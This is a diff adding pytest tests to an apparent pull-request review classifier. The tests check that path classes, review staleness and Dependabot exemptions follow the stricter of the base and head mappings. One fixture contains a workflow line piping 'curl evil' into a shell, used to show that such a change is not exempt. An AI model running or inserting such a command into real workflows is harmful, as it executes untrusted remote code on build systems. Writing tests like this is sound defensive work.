@@ -241,6 +241,27 @@ def test_a_head_mapping_cannot_lower_its_own_pull_request() -> None:
     assert any("lowers 2 tracked files" in line for line in rc.render(report))
 
 
+def test_each_path_takes_the_higher_of_the_base_and_head_mappings() -> None:
+    # The mapping differs between base and head although this pull request does not change
+    # it (main tightened it after the branch point): the higher class counts, either way.
+    low = MAPPING_TEXT.replace('default = "High"', 'default = "Low"', 1).replace(
+        'class = "High"\nwhy = "§2 High: a migration',
+        'class = "Low"\nwhy = "§2 High: a migration',
+        1,
+    )
+    assert 'default = "Low"' in low and 'class = "Low"\nwhy = "§2 High: a migration' in low
+    changes = _changes("M migrations/0001_conventions.sql", "A newtool/x.yaml")
+    for side in (HEAD, BASE):
+        report = _run(FakeRepo(changes, files={(side, rc.MAPPING_PATH): low}), _body("Low"))
+        assert report.computed == HIGH, side
+        assert (
+            "migrations/0001_conventions.sql",
+            "§2 High: a migration or stored data",
+        ) in report.deciding
+        assert any("declared Low, the paths require High" in f for f in report.failures)
+        assert report.lowered == []  # step 3 did not run: the mapping is not in the diff
+
+
 def test_an_empty_diff_is_low() -> None:
     report = _run(FakeRepo([]), _body("Low"))
     assert (report.computed, report.effective, report.failures) == (LOW, LOW, [])
@@ -424,6 +445,24 @@ def test_a_review_is_stale_once_a_high_path_of_the_pull_request_changed_after_it
     assert _run(FakeRepo(changes), _body(review=fixed)).failures == []
 
 
+def test_a_review_is_stale_when_either_mapping_makes_the_changed_path_high() -> None:
+    # The staleness check uses the same higher-of-both rule as the class: a mapping that
+    # differs between base and head (the pull request does not change it) cannot make a
+    # High path changed after the review look Low.
+    low = MAPPING_TEXT.replace(
+        'class = "High"\nwhy = "§2 High: a migration',
+        'class = "Low"\nwhy = "§2 High: a migration',
+        1,
+    )
+    assert low != MAPPING_TEXT
+    changes = _changes("M migrations/0001_conventions.sql", "M docs/a.md")
+    after = {SECOND: ["migrations/0001_conventions.sql"]}
+    for side in (HEAD, BASE):
+        repo = FakeRepo(changes, files={(side, rc.MAPPING_PATH): low}, after=after)
+        failures = _run(repo, _body()).failures
+        assert any("1 High paths changed after the review" in f for f in failures), side
+
+
 # --- Bots --------------------------------------------------------------------------------
 
 PIN = "@@ -1 +1 @@\n-      uses: a/b@111 # v1\n+      uses: a/b@222 # v2\n"
@@ -458,6 +497,27 @@ def test_any_other_dependabot_change_is_handled_as_any_pull_request(
     assert any(f.startswith("Declaration: Missing") for f in report.failures)
     # Another author changing only pins is never exempt.
     assert _run(FakeRepo(_changes("M pnpm-lock.yaml")), "", author="someone").exempt is None
+
+
+def test_dependabot_is_exempt_only_where_both_the_base_and_head_mappings_exempt_it() -> None:
+    # The stricter mapping decides: a file one side no longer exempts (it falls to the High
+    # default), or a workflow one side marks "pins", is handled as any pull request is.
+    no_lock = MAPPING_TEXT.replace('    "pnpm-lock.yaml",\n', "", 1)
+    assert rc.classify("pnpm-lock.yaml", rc.parse_mapping(no_lock))[0] == HIGH
+    any_pin = MAPPING_TEXT.replace('dependabot = "pins"', 'dependabot = "any"', 1)
+    assert any_pin != MAPPING_TEXT
+    unpinned = {".github/workflows/ci.yml": PIN + "+      run: curl evil | sh\n"}
+    assert _run(FakeRepo(_changes("M pnpm-lock.yaml")), "", author=rc.DEPENDABOT).exempt
+    for side in (HEAD, BASE):
+        cases = [
+            FakeRepo(_changes("M pnpm-lock.yaml"), files={(side, rc.MAPPING_PATH): no_lock}),
+            FakeRepo(_changes("M .github/workflows/ci.yml"), diffs=unpinned,
+                     files={(side, rc.MAPPING_PATH): any_pin}),
+        ]  # fmt: skip
+        for repo in cases:
+            report = _run(repo, "", author=rc.DEPENDABOT)
+            assert report.exempt is None, (side, repo.changed)
+            assert any(f.startswith("Declaration: Missing") for f in report.failures)
 
 
 # --- The body is data; the output is bounded ---------------------------------------------
